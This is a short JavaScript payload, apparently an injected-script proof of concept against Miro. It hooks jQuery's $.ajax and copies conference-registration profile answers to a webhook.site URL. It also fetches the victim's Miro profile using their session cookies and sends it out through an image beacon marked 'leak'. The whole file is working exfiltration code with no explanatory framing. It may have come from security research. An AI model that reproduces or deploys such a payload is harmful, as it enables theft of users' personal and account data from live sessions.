(function () {
  // Intercept jQuery $.ajax
  if (typeof $ !== 'undefined') {
    const originalAjax = $.ajax;
    $.ajax = function (options) {
      if (
        options.url &&
        options.type === 'POST' &&
        options.url.includes('/conference_registrations/') &&
        options.url.includes('/update_attendee_profile_question')
      ) {
        fetch('https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: typeof options.data === 'string' ? options.data : JSON.stringify(options.data)
        });
      }
      return originalAjax.apply(this, arguments);
    };
  }

  // Fetch profile data and leak reduced object
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(profileData => {
      // Remove unwanted keys
      const {
        achievements,
        subscriptions,
        toolbarPlugins,
        interests,
        betaFeatures,
        ...slimProfileData
      } = profileData;

      // Send reduced profile via image beacon
      const img = new Image();
      img.src = "https://webhook.site/6f357c7b-0aa6-435d-b9d6-24b85f931aea?leak=" +
        encodeURIComponent(JSON.stringify(slimProfileData));
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
